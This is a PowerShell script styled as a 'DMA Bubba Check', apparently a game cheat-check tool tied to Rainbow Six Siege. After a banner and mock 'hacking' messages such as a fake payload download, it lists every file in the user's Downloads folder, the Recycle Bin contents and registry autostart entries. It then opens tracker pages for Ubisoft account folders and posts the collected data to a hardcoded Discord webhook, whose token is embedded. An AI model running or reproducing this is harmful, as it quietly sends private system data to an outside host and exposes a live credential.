# Set PowerShell console colors
$X0 = $Host.UI.RawUI
$X0.BackgroundColor = 'Black'
$X0.ForegroundColor = 'Red'
Clear-Host

# ASCII Banner
Write-Host @'
██████╗ ███╗   ███╗ █████╗     ██████╗ ██╗   ██╗██████╗ ██████╗  █████╗
██╔══██╗████╗ ████║██╔══██╗    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗
██║  ██║██╔████╔██║███████║    ██████╔╝██║   ██║██████╔╝██████╔╝███████║
██║  ██║██║╚██╔╝██║██╔══██║    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██║
██████╔╝██║ ╚═╝ ██║██║  ██║    ██████╔╝╚██████╔╝██████╔╝██████╔╝██║  ██║
╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝

 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
██║     ███████║█████╗  ██║     █████╔╝
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
'@

# Progress Messages
Start-Sleep -Milliseconds 400; Write-Host "Injecting mainframe hooks..."
Start-Sleep -Milliseconds 600; Write-Host "Zuko Wittally in the main frame."
Start-Sleep -Milliseconds 600; Write-Host "Thanks for the cookies..."
Start-Sleep -Milliseconds 600; Write-Host "Shout out to Reapiin Tech..."
Start-Sleep -Milliseconds 600; Write-Host "Establishing DMA uplink..."
Start-Sleep -Milliseconds 600; Write-Host "Verifying MojoJojo Tech protocols..."
Start-Sleep -Milliseconds 600; Write-Host "Reapiin uses ChatGPT..."
Start-Sleep -Milliseconds 600; Write-Host "Reapiin is ChatGPT made."
Start-Sleep -Milliseconds 600; Write-Host "Downloading... get_ratted_payload.dll"
Start-Sleep -Milliseconds 800; Write-Host "Bypassing firewall shadows..."
Start-Sleep -Milliseconds 600; Write-Host "System hook injected successfully."

# Add Clipboard Support
Add-Type -AssemblyName System.Windows.Forms

# Initialize results array
$Z = @()

# Downloads folder scan
$DL = "$env:USERPROFILE\Downloads"
$Z += "`n--- Downloads folder files ---`n"
if (Test-Path $DL) {
    Get-ChildItem -Path $DL -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $Z += "Found: $($_.FullName)"
    }
} else {
    $Z += "Downloads folder not found."
}

# Recycle Bin scan
$Z += "`n--- Recycle Bin ---`n"
$sh = New-Object -ComObject ("Shell.Application")
$rb = $sh.Namespace(0xa)
if ($rb.Items().Count -gt 0) {
    $rb.Items() | ForEach-Object {
        $Z += "Deleted File: $($_.Path)"
    }
} else {
    $Z += "Recycle Bin is empty."
}

# Registry scan for .exe autostarts
$Z += "`n--- Registry EXE references ---`n"
$paths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($path in $paths) {
    $Z += "`n> $path"
    if (Test-Path $path) {
        Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | ForEach-Object {
                if ($_.Value -match "\.exe") {
                    $Z += "$($_.Name): $($_.Value)"
                }
            }
        }
    } else {
        $Z += "Path not found."
    }
}

# Copy result to clipboard
[System.Windows.Forms.Clipboard]::SetText($Z -join "`r`n")
Write-Host "`nScan complete. Results copied to clipboard." -ForegroundColor Green

# Ubisoft folder scan and link open
$ubisoftPath = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\savegames"
if (Test-Path $ubisoftPath) {
    Write-Host "Found Ubisoft savegames folder. Retrieving folder names..."
    $savegameFolders = Get-ChildItem -Path $ubisoftPath -Directory | Select-Object -ExpandProperty Name
    foreach ($folderName in $savegameFolders) {
        $url = "https://r6.tracker.network/r6siege/profile/ubi/$folderName"
        Write-Host "Opening $url"
        Start-Process $url
    }
    Write-Host "Ubisoft profile links opened in browser."
} else {
    Write-Host "Ubisoft savegames folder not found."
}

# Send results to Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
$payload = @{
    content = $Z -join "`r`n"
}
$jsonPayload = $payload | ConvertTo-Json -Compress
Write-Host "Sending payload to Discord webhook: $jsonPayload"

try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
    Write-Host "Response from Discord: $response" -ForegroundColor Green
} catch {
    Write-Host "Error sending message to Discord webhook: $_" -ForegroundColor Red
}